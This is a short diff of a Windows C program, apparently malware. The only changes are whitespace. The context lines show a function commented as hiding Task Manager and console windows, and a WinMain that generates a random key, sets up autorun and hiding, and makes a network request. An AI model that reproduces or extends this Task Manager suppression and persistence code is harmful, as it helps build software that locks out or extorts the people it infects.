@@ -26,7 +26,7 @@ int isWrong=0;
 
 // 隐藏任务管理器窗口/cmd
 void KillTaskmgr()
-{
+{   
     // 查找任务管理器窗口句柄
     taskmgrWnd = FindWindowA("TaskManagerWindow", NULL);
     cmdWnd = FindWindowA("ConsoleWindowClass", NULL);
@@ -56,7 +56,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     RandomMiYao();
     AutoRunAndHide(); 
     MakeRequest();  
-    
+
     // 创建主窗口
     WNDCLASS wc = { 0 };
     wc.lpfnWndProc = WindowProc;
